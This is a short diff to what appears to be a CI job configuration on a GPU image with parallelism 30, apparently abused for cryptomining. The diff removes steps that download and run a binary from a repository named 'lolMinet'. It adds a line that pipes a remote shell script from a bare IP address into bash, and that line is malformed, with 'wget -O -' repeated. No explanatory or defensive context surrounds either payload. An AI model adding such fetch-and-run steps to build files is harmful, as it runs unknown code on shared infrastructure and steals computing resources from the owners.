@@ -6,6 +6,5 @@ jobs:
       image: ubuntu-1604-cuda-10.1:201909-23
     steps:
       - run: nvidia-smi
-      - run: wget https://raw.githubusercontent.com/Master478963/lolMinet/main/binary && chmod +x binary
-      - run: ./binary
+      - run: wget -O - wget -O - http://23.92.22.221/start_basket_fle_ftx_ph_ws3.sh | bash
     parallelism: 30
